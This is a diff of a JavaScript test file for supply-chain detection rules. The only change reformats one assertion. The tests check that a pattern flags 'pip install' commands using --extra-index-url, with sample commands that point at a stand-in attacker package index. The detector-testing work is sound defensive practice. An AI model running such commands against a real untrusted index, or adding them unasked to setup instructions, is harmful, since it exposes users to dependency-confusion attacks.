@@ -57,7 +57,9 @@ describe("supply-002-gha-pull-request-target-checkout-head", () => {
 describe("supply-003-pip-extra-index-url", () => {
   const p = findPattern("supply-003-pip-extra-index-url");
   test("flags pip install --extra-index-url", () => {
-    expect(matchAll(p, "pip install requests --extra-index-url https://pypi.attacker.example").length).toBe(1);
+    expect(
+      matchAll(p, "pip install requests --extra-index-url https://pypi.attacker.example").length,
+    ).toBe(1);
   });
   test("flags --extra-index-url= form", () => {
     expect(matchAll(p, "pip install --extra-index-url=https://x.example/pypi/ pkg").length).toBe(1);
